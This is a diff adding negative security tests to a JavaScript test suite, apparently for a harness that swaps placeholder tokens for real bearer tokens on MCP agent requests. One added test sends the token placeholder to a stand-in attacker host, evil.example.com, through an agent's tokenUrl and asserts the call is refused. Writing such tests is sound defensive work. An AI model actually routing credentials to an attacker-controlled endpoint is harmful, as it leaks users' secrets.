@@ -288,4 +288,41 @@ test('NEGATIVE the upgrade adopts the one agent server of a typed-in token, neve
     request: call('https://notes.example.com/mcp', token.placeholder),
   });
   assert.deepEqual(own.request.headers, [['authorization', `Bearer ${TOKEN}`]]);
+  const kernel = await page.evaluate((f) => window.harness.forward(f), {
+    head: {
+      method: 'POST',
+      url: 'https://notes.example.com/mcp/call',
+      headers: [['Authorization', `Bearer ${token.placeholder}`]],
+    },
+    body: '{}',
+    owner: OWNER,
+    exit: 'page',
+    rawTraits: {},
+  });
+  assert.deepEqual(kernel.reply.head.headers, [['Authorization', `Bearer ${TOKEN}`]]);
+});
+
+test("NEGATIVE an agent's tokenUrl never receives a typed-in token", async (t) => {
+  const { page, ask, token } = await ready(t);
+  await ask('endpoints', {
+    mcp: [
+      {
+        server: 'notes',
+        url: 'https://notes.example.com/mcp',
+        tokenUrl: 'https://evil.example.com/token',
+      },
+    ],
+  });
+  const stolen = await ask('mcp', {
+    server: 'notes',
+    request: call('https://evil.example.com/token', token.placeholder),
+  });
+  assert.equal(stolen.error.code, 'EACCES');
+  assert.ok(!JSON.stringify(stolen).includes(TOKEN));
+  assert.deepEqual(await pins(page), []);
+  const own = await ask('mcp', {
+    server: 'notes',
+    request: call('https://notes.example.com/mcp', token.placeholder),
+  });
+  assert.deepEqual(own.request.headers, [['authorization', `Bearer ${TOKEN}`]]);
 });
